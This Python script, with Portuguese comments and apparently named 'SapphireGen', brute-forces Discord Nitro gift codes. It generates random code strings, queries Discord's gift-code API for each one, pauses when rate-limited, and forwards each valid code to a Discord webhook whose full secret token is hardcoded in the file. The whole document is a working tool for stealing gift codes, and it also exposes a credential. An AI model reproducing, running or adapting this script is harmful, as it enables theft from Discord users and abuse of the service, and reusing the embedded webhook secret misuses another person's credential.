import requests
import random
import string
import time

# Função para enviar mensagens para o Webhook do Discord
def send_webhook(webhook_url, message):
    payload = {"content": message}
    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            pass  # Sucesso, não imprime nada no terminal
        else:
            print(f"Erro ao enviar mensagem para o webhook: {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar mensagem para o webhook: {e}")

# Função principal de geração de códigos
class SapphireGen:
    def __init__(self, code_type: str, codes: int, webhook_url: str):
        self.type = code_type
        self.codes = codes
        self.session = requests.Session()
        self.webhook_url = webhook_url

    def generate(self):
        valid_codes = 0
        generated_codes = set()

        while valid_codes < self.codes:
            try:
                # Gerar código aleatório (24 caracteres para "boost", 16 para "classic")
                code = "".join(
                    random.choices(string.ascii_letters + string.digits, k=24 if self.type == "boost" else 16)
                )

                # Verificar se o código foi gerado antes
                if code in generated_codes:
                    continue
                generated_codes.add(code)

                # Validar o código
                print(f"Verificando o código: {code}")  # Adicionado para verificar os códigos no terminal

                req = self.session.get(
                    f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                    timeout=10,
                )

                if req.status_code == 200:
                    # Código válido, enviar para o webhook
                    print(f"Código válido encontrado: discord.gift/{code}")  # Imprime no terminal para depuração
                    send_webhook(self.webhook_url, f"discord.gift/{code}")
                    valid_codes += 1
                elif req.status_code == 429:
                    # Se rate-limite for atingido, aguarda 2 segundos
                    print(f"Rate limit atingido, aguardando...")  # Para depuração
                    time.sleep(2)

            except Exception as e:
                print(f"Erro ao gerar o código ou ao fazer requisição: {e}")  # Para depuração

if __name__ == "__main__":
    # URL do webhook do Discord
    webhook_url = "https://discord.com/api/webhooks/1346085542026149949/xdN-GdWGAtUOgUXIWeLnRyl4FVpz3OMhxV0V1bM3ujIXVZb_tedcPlj-4HDCgvwHVHxg"

    # Tipo de código (boost ou classic)
    code_type = "boost"  # Pode ser "boost" ou "classic"

    # Número de códigos válidos a serem gerados
    codes_to_generate = 10  # Modifique esse número conforme necessário

    # Passando a URL do webhook para a classe SapphireGen
    SapphireGen(code_type, codes_to_generate, webhook_url).generate()
